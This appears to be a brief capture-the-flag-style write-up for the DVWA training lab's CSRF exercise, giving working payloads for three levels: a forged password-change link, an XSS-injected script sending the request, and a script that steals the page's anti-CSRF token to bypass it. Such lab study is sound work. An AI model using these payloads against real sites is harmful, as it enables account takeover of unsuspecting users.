## Low
This has basically no security so we simply make the victim click the link.  
http://localhost/vulnerabilities/csrf/?password_new=lemao&password_conf=lemao&Change=Change
</br>

## Medium
In this level the code checks where the script is being run from. So we need to execute the script from the web application page using cross site scripting.  
```
<script>
var x = new XMLHttpRequest();
x.open("GET", "http://localhost/vulnerabilities/csrf/?password_new=lemao&password_conf=lemao&Change=Change");
x.send();
</script>
```
</br>

## High
This level uses anti csrf token. But the token is easily accessible. We first get the token and pass it with our request.
```
<script>
var tok = document.getElementsByName("user_token")[0].value
var x = new XMLHttpRequest();
x.open("GET", "http://localhost/vulnerabilities/csrf/?password_new=asd&password_conf=asd&Change=Change&user_token="+tok);
x.send();
</script>
```